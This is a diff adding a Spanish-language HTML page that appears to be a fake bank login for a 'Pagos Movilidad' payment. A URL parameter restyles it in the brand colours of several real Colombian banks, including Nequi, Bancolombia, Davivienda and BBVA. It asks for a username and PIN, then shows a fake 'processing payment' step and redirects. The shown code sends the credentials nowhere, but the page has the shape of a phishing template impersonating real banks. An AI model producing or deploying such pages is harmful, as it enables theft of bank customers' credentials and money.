@@ -1,0 +1,200 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sucursal Virtual - Banco</title>
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" rel="stylesheet">
+    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;700&display=swap" rel="stylesheet">
+    <style>
+        body {
+            font-family: 'Roboto', sans-serif;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            background-color: #f4f4f4;
+        }
+        .bank-container {
+            background: white;
+            width: 100%;
+            max-width: 400px;
+            border-radius: 10px;
+            box-shadow: 0 5px 25px rgba(0,0,0,0.15);
+            overflow: hidden;
+            text-align: center;
+        }
+        .bank-header {
+            padding: 25px;
+            color: white;
+            font-size: 1.2rem;
+            font-weight: 500;
+        }
+        .bank-logo {
+            font-size: 2rem;
+            margin-bottom: 10px;
+        }
+        .bank-content {
+            padding: 30px;
+        }
+        .transaction-info {
+            background: #f9f9f9;
+            padding: 15px;
+            border-radius: 8px;
+            margin-bottom: 25px;
+            text-align: left;
+            font-size: 0.9rem;
+            color: #555;
+        }
+        .transaction-info p {
+            margin: 5px 0;
+            display: flex;
+            justify-content: space-between;
+        }
+        .transaction-info strong {
+            color: #333;
+        }
+        .form-group {
+            margin-bottom: 20px;
+            text-align: left;
+        }
+        .form-group label {
+            display: block;
+            margin-bottom: 5px;
+            font-size: 0.9rem;
+            color: #666;
+        }
+        .form-control {
+            width: 100%;
+            padding: 12px;
+            border: 1px solid #ddd;
+            border-radius: 6px;
+            font-size: 1rem;
+            box-sizing: border-box;
+        }
+        .btn-pay {
+            width: 100%;
+            padding: 15px;
+            border: none;
+            border-radius: 6px;
+            font-size: 1rem;
+            font-weight: bold;
+            cursor: pointer;
+            transition: opacity 0.2s;
+            color: white;
+        }
+        .btn-pay:hover {
+            opacity: 0.9;
+        }
+        .secure-badge {
+            margin-top: 20px;
+            color: #888;
+            font-size: 0.8rem;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 5px;
+        }
+        
+        /* Bank Specific Styles */
+        .nequi { background-color: #20002c; }
+        .nequi .btn-pay { background-color: #da0081; }
+        
+        .bancolombia { background-color: #FDDA24; color: #000 !important; }
+        .bancolombia .bank-header { color: #000; }
+        .bancolombia .btn-pay { background-color: #000; color: #FDDA24; }
+        
+        .davivienda { background-color: #ed1c24; }
+        .davivienda .btn-pay { background-color: #ad151b; }
+        
+        .bogota { background-color: #004481; }
+        .bogota .btn-pay { background-color: #002a50; }
+        
+        .daviplata { background-color: #ed1c24; }
+        .daviplata .btn-pay { background-color: #ad151b; }
+        
+        .bbva { background-color: #072146; }
+        .bbva .btn-pay { background-color: #1973b8; }
+        
+        .default-bank { background-color: #333; }
+        .default-bank .btn-pay { background-color: #555; }
+
+    </style>
+</head>
+<body>
+
+    <div class="bank-container">
+        <div id="bank-header" class="bank-header default-bank">
+            <div class="bank-logo">
+                <i class="fas fa-university"></i>
+            </div>
+            <div id="bank-name">Banco</div>
+        </div>
+        
+        <div class="bank-content">
+            <div class="transaction-info">
+                <p><span>Comercio:</span> <strong>Pagos Movilidad</strong></p>
+                <p><span>Referencia:</span> <strong id="ref-val">...</strong></p>
+                <p><span>Valor:</span> <strong id="amount-val">$0</strong></p>
+            </div>
+
+            <form id="bank-login-form">
+                <div class="form-group">
+                    <label>Usuario / Número de Celular</label>
+                    <input type="text" class="form-control" required placeholder="Ingrese su usuario">
+                </div>
+                <div class="form-group">
+                    <label>Clave / PIN</label>
+                    <input type="password" class="form-control" required placeholder="••••">
+                </div>
+                
+                <button type="submit" id="pay-btn" class="btn-pay default-bank">Entrar y Pagar</button>
+            </form>
+
+            <div class="secure-badge">
+                <i class="fas fa-lock"></i> Transacción Segura
+            </div>
+        </div>
+    </div>
+
+    <script>
+        const urlParams = new URLSearchParams(window.location.search);
+        const bankName = urlParams.get('bank') || 'Banco';
+        const ref = urlParams.get('ref') || 'N/A';
+        const val = urlParams.get('val') || '0';
+
+        document.getElementById('bank-name').innerText = bankName;
+        document.getElementById('ref-val').innerText = ref;
+        document.getElementById('amount-val').innerText = '$' + parseInt(val).toLocaleString();
+        
+        // Apply bank styles
+        const header = document.getElementById('bank-header');
+        const btn = document.getElementById('pay-btn');
+        const lowerBank = bankName.toLowerCase();
+        
+        let styleClass = 'default-bank';
+        if (lowerBank.includes('nequi')) styleClass = 'nequi';
+        else if (lowerBank.includes('bancolombia')) styleClass = 'bancolombia';
+        else if (lowerBank.includes('davivienda')) styleClass = 'davivienda';
+        else if (lowerBank.includes('bogot')) styleClass = 'bogota';
+        else if (lowerBank.includes('daviplata')) styleClass = 'daviplata';
+        else if (lowerBank.includes('bbva')) styleClass = 'bbva';
+
+        header.className = `bank-header ${styleClass}`;
+        btn.className = `btn-pay ${styleClass}`;
+
+        document.getElementById('bank-login-form').addEventListener('submit', (e) => {
+            e.preventDefault();
+            btn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Procesando Pago...';
+            btn.disabled = true;
+            
+            setTimeout(() => {
+                // Redirect to success page
+                window.location.href = `respuesta.html?ref=${ref}&val=${val}&bank=${encodeURIComponent(bankName)}`;
+            }, 2000);
+        });
+    </script>
+</body>
+</html>
